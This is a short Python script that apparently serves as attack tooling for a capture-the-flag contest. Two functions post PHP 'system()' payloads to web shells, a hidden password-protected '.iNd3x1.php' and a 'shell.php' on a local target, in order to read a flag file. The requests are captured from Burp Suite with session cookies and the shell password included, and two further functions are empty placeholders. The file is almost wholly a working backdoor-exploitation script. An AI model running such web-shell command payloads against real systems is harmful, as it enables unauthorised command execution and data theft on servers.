# -*-coding:UTF-8-*-
import requests

def poc0(burp0_url, flag):
    # this is flag submit func, put burpsuite request here

    return True

def poc1(burp0_url):

    #burp0_url = "http://127.0.0.1:10001/.iNd3x1.php"
    burp0_cookies = {"PHPSESSID": "3f6c2f6c32cbeeb477d3ff73bdcbf60d", "ECS_ID": "d473ed4416b5dfec0334816ee636da9ea944a3ea", "ECS[visit_times]": "4", "ECS[history]": "72%2C63", "ECSCP_ID": "320f0b37689d431a7c8034e3e8a253b58ad3c928", "JSESSIONID": "8DD3845F5678659FB3DCC04F22972E98", "ECS[display]": "grid"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:10001", "Connection": "close", "Referer": "http://127.0.0.1:10001/.iNd3x1.php", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"pass": "AmTr41nS3c", "a": "system('cat /flag');"}
    res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    return res.text

def poc2(burp0_url):

    #burp0_url = "http://127.0.0.1:10001/shell.php"
    burp0_cookies = {"PHPSESSID": "3f6c2f6c32cbeeb477d3ff73bdcbf60d", "ECS_ID": "d473ed4416b5dfec0334816ee636da9ea944a3ea", "ECS[visit_times]": "4", "ECS[history]": "72%2C63", "ECSCP_ID": "320f0b37689d431a7c8034e3e8a253b58ad3c928", "JSESSIONID": "8DD3845F5678659FB3DCC04F22972E98", "ECS[display]": "grid"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1:10001", "Connection": "close", "Referer": "http://127.0.0.1:10001/.iNd3x1.php", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"1": "system('cat /flag');"}
    res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    return res.text

def poc3(burp0_url):
    # put burpsuite request here

    return True